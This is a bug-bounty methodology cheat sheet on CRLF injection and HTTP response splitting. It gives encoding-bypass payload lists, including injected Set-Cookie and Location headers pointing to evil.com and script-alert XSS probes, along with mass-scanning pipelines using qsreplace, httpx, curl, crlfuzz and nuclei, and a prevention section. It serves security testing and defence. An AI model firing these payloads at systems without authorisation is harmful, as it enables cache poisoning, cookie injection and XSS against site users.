# CRLF Injection (HTTP Response Splitting)

> Comprehensive CRLF injection testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

CRLF (Carriage Return Line Feed) injection, also known as HTTP response splitting, occurs when an attacker injects CRLF sequences (`%0d%0a`) into HTTP headers, allowing them to split responses, inject arbitrary headers, perform cache poisoning, or escalate to XSS. Based on OWASP HTTP Response Splitting, PortSwigger CRLF research, and 2025–2026 trends (cache poisoning via header injection, request smuggling chaining, browser‑specific parsing differences, Unicode bypasses).

## Methodology

### 1. Target & Parameter Identification
- **Common vulnerable parameter names:** Any user‑controlled input reflected in HTTP headers (e.g., `url=`, `redirect=`, `path=`, `file=`, `id=`, `lang=`, `theme=`, `session=`, `token=`)
- **Header injection points:** `Location`, `Set‑Cookie`, `X‑Forwarded‑Host`, `X‑Forwarded‑For`, `User‑Agent`, `Referer`, `X‑Debug`, `X‑Cache`
- **Reflection detection:** Input appears in response headers (check with `curl -I` or Burp)
- **Contexts:** URL parameters, POST data, cookies, HTTP request headers

### 2. Injection Techniques
- **Basic CRLF:** `%0d%0a` (CRLF), `%0a` (LF), `%0d` (CR)
- **URL‑encoded variants:** `%250d%250a`, `%250a`, `%250d` (double encoding)
- **Unicode bypass:** `%u000d%u000a`, `%e0%80%8a` (overlong UTF‑8)
- **HTML entities:** `&#13;&#10;` (if decoded)
- **Mixed case:** `%0D%0A`, `%0Da`
- **Extra characters:** `%0d%0a%0d%0a`, `%0d%0a%20`

### 3. Exploitation Scenarios
- **HTTP response splitting:** Inject two responses, second controlled by attacker
- **Header injection:** Add arbitrary headers (`X‑SS: <script>alert(1)</script>`)
- **Cache poisoning:** Inject `X‑Cache` or `Cache‑Control` headers to poison cache
- **Set‑Cookie injection:** Create malicious cookies (`Set‑Cookie: attacker=value`)
- **XSS via header injection:** Inject `X‑SS` header with JavaScript payload (if reflected in body)
- **Request smuggling chaining:** Combine with HTTP request smuggling (CL.TE / TE.CL)

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# CRLF‑specific tools
git clone https://github.com/dwisiswant0/crlfuzz.git  # Fast CRLF injection fuzzer
go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest

# Parameter discovery & manipulation
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/qsreplace@latest
```

## Testing Commands

### 1. Parameter Discovery & Enumeration

```bash
# Extract URLs with parameters
grep "?" crawledurls.txt > paramurls.txt

# GF pattern matching for CRLF
gf crlf paramurls.txt > gf-crlf.txt  # Use gf crlf pattern

# Custom pattern for header‑related parameters
grep -E "(url=|redirect=|path=|file=|id=|lang=|theme=|session=|token=|return=|dest=|destination=|next=|goto=|forward=|location=|header=|cookie=|setcookie=)" crawledurls.txt | anew crlf-params-additional.txt
```

### 2. Basic CRLF Detection

```bash
# Test with simple CRLF injection
cat gf-crlf.txt | qsreplace "%0d%0aX-Injected: header" | httpx -silent -match-string "X-Injected" | tee crlf-basic-hits.txt

# Test with LF only
cat gf-crlf.txt | qsreplace "%0aX-Injected: header" | httpx -silent -match-string "X-Injected" | tee crlf-lf-hits.txt

# Test with CR only
cat gf-crlf.txt | qsreplace "%0dX-Injected: header" | httpx -silent -match-string "X-Injected" | tee crlf-cr-hits.txt
```

### 3. Advanced Payload Testing

```bash
# Create payloads file with various bypasses
cat > crlf-payloads.txt << EOF
%0d%0aX-Injected: header
%0aX-Injected: header
%0dX-Injected: header
%0D%0AX-Injected: header
%250d%250aX-Injected: header
%250aX-Injected: header
%250dX-Injected: header
%u000d%u000aX-Injected: header
%e0%80%8aX-Injected: header
&#13;&#10;X-Injected: header
%0d%0a%0d%0aX-Injected: header
%0d%0a%20X-Injected: header
%0d%0aX-SS: <script>alert(1)</script>
%0d%0aSet-Cookie: attacker=value
%0d%0aLocation: https://evil.com
%0d%0aX-Cache: max-age=0
%0d%0aCache-Control: no-store
%0d%0aX-Forwarded-Host: evil.com
EOF

# Iterate through payloads
cat gf-crlf.txt | while read -r param_url; do
  while read -r payload; do
    echo "${param_url}${payload}"
  done < crlf-payloads.txt
done | httpx -silent -match-string "X-Injected\|X-SS\|Set-Cookie\|Location\|X-Cache\|Cache-Control\|X-Forwarded-Host" | tee crlf-advanced-hits.txt
```

### 4. Header Injection via Host Header

```bash
# Test Host header injection (manual)
curl -H "Host: target.com%0d%0aX-Injected: test" "http://target.com/"

# Automated Host header injection testing
cat alive-domains.txt | xargs -I@ curl -H "Host: @%0d%0aX-Injected: test" "http://@" -I | grep -q "X-Injected" && echo "Vulnerable: @"

# Automated Host header injection testing
cat alive-domains.txt | httpx -silent -ports 80,443 | while read url; do
  curl -sI "http://$url" -H "Host: test%0d%0aX-Injected: test" 2>/dev/null | grep -i "X-Injected" && echo "VULN: $url"
done
```

### 5. Cache Poisoning via CRLF

```bash
# Inject cache-control headers
curl "http://target.com/page?param=value%0d%0aCache-Control: max-age=0%0d%0aX-Injected: test"

# Test with X-Forwarded-Host
curl -H "X-Forwarded-Host: evil.com%0d%0aX-Injected: test" "http://target.com/"
```

### 6. Automated Scanning with Crlfuzz

```bash
# Scan single URL
crlfuzz -u "https://target.com/page?url=test"

# Scan list of URLs
cat gf-crlf.txt | crlfuzz -o crlfuzz-results.txt

# With custom payloads
crlfuzz -u "https://target.com/page?url=test" -p crlf-payloads.txt
```

### 7. Nuclei Templates for CRLF

```bash
# Scan with nuclei CRLF templates
nuclei -u https://target.com -t ~/nuclei-templates/crlf/ -o nuclei-crlf.txt

# Use specific tags
nuclei -u https://target.com -tags crlf -o nuclei-crlf-tagged.txt
```

### 8. Response Splitting Detection

```bash
# Check for double response (look for two HTTP status lines)
cat gf-crlf.txt | qsreplace "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>" | httpx -silent -match-string "<script>alert" | tee response-splitting-hits.txt
```

### 9. Chained Exploitation (CRLF + XSS)

```bash
# Inject XSS payload via header
cat gf-crlf.txt | qsreplace "%0d%0aX-SS: <script>alert(document.domain)</script>" | httpx -silent -match-string "<script>alert" | tee crlf-xss-hits.txt

# If header reflected in body, trigger XSS
curl -H "X-SS: <script>alert(1)</script>" "http://target.com/"
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

- **Unicode overlong UTF‑8 encoding:** `%e0%80%8a`, `%c0%8a`
- **Double/triple URL encoding:** `%250d%250a`, `%25250d%25250a`
- **HTML entity encoding:** `&#13;&#10;` (if application decodes entities)
- **Browser‑specific parsing:** Chrome vs Firefox vs Safari handling of `%0d%0a` in headers
- **HTTP/2 multiplexing:** CRLF injection in HTTP/2 headers (less common)
- **Request smuggling chaining:** Use CRLF to create `Transfer‑Encoding: chunked` confusion
- **WAF evasion:** Mixed case, extra whitespace, tab characters (`%09`)

## Detection & Verification

- **Injected header appears in response** – e.g., `X‑Injected: header` present
- **Response splitting** – two HTTP response status lines in single response
- **Cache poisoning** – injected `Cache‑Control` headers affect caching behavior
- **XSS execution** – JavaScript payload in header triggers XSS (if reflected)
- **PoC:** Screenshot of injected headers, network traffic capture, demonstration of cache poisoning/XSS

## Prevention (Developer View – OWASP Latest)

1. **Validate & sanitize user input** before including in HTTP headers
2. **Use framework‑safe header APIs** – never concatenate strings into headers
3. **Encode CRLF sequences** – replace `%0d%0a`, `%0a`, `%0d` with safe characters
4. **Strict allow‑list validation** for redirect URLs, cookie values, etc.
5. **Security headers** – `Content‑Security‑Policy`, `X‑Content‑Type‑Options`
6. **Regular security testing** – include CRLF injection checks in CI/CD pipelines
7. **WAF rules** – detect CRLF sequences in request headers/parameters

## References

- **OWASP HTTP Response Splitting**: https://owasp.org/www‑community/attacks/HTTP_Response_Splitting
- **PortSwigger CRLF Injection**: https://portswigger.net/web‑security/crlf‑injection
- **PayloadsAllTheThings – CRLF Injection**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
- **2025–2026 write‑ups**: Cache poisoning via CRLF, chained exploits (Bugcrowd, HackerOne)

> **Happy (ethical) hunting** — CRLF injection remains a versatile vulnerability enabling header injection, cache poisoning, and XSS!
